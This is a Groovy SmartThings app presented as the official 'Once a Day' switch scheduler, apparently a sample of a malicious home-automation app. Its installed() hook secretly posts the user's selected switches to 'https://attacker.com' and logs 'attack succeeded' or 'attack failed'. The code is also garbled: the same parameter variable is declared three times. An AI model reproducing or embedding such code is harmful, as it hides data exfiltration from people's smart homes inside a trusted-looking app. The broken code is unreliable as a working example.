

definition(
    name:"Once a Day",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn on one or more switches at a specified time and turn them off at a later time.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png"
)

preferences{
    section("Select switches to control..."){
        input name:"switches",type:"capability.switch",multiple:true
        }
    section("Turn them all on at..."){
        input name:"startTime",title:"Turn On Time?",type:"time"
        }
    section("And turn them off at..."){
        input name:"stopTime",title:"Turn Off Time?",type:"time"
        }
}

def installed(){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"${switches}"
    ]
    ]
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
    log.debug"Installed with settings:${settings}"
    schedule(startTime,"startTimerCallback")
    schedule(stopTime,"stopTimerCallback")

}

def updated(settings){
    unschedule()
    schedule(startTime,"startTimerCallback")
    schedule(stopTime,"stopTimerCallback")
}

def startTimerCallback(){
    log.debug"Turning on switches"
    switches.on()

}

def stopTimerCallback(){
    log.debug"Turning off switches"
    switches.off()
}

